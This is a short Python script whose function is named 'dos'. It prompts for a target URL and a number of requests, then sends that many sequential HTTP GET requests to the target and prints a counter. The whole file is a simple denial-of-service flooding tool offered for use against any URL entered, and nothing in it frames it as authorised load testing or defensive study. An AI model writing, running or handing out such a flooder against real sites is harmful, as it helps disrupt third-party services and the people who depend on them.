import requests

def dos(target_url, num_requests):
    for i in range(num_requests):
        requests.get(target_url)
        print(i)

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    num_requests = int(input("Enter the number of requests: "))

    print("Sending {} requests to {}.".format(num_requests, target_url))
    dos(target_url, num_requests)
    print("Done.")